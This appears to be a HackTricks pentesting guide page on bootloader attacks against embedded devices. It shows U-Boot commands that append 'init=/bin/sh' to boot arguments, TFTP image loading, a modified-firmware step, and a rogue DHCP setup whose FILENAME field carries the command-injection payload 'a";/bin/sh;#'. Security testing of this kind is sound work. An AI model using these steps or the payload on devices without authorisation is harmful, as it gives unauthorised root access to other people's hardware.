{{#include ../../banners/hacktricks-training.md}}

The following steps are recommended for modifying device startup configurations and bootloaders like U-boot:

1. **Access Bootloader's Interpreter Shell**:

   - During boot, press "0", space, or other identified "magic codes" to access the bootloader's interpreter shell.

2. **Modify Boot Arguments**:

   - Execute the following commands to append '`init=/bin/sh`' to the boot arguments, allowing execution of a shell command:
     %%%
     #printenv
     #setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
     #saveenv
     #boot
     %%%

3. **Setup TFTP Server**:

   - Configure a TFTP server to load images over a local network:
     %%%
     #setenv ipaddr 192.168.2.2 #local IP of the device
     #setenv serverip 192.168.2.1 #TFTP server IP
     #saveenv
     #reset
     #ping 192.168.2.1 #check network access
     #tftp ${loadaddr} uImage-3.6.35 #loadaddr takes the address to load the file into and the filename of the image on the TFTP server
     %%%

4. **Utilize `ubootwrite.py`**:

   - Use `ubootwrite.py` to write the U-boot image and push a modified firmware to gain root access.

5. **Check Debug Features**:

   - Verify if debug features like verbose logging, loading arbitrary kernels, or booting from untrusted sources are enabled.

6. **Cautionary Hardware Interference**:

   - Be cautious when connecting one pin to ground and interacting with SPI or NAND flash chips during the device boot-up sequence, particularly before the kernel decompresses. Consult the NAND flash chip's datasheet before shorting pins.

7. **Configure Rogue DHCP Server**:
   - Set up a rogue DHCP server with malicious parameters for a device to ingest during a PXE boot. Utilize tools like Metasploit's (MSF) DHCP auxiliary server. Modify the 'FILENAME' parameter with command injection commands such as `'a";/bin/sh;#'` to test input validation for device startup procedures.

**Note**: The steps involving physical interaction with device pins (\*marked with asterisks) should be approached with extreme caution to avoid damaging the device.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

{{#include ../../banners/hacktricks-training.md}}



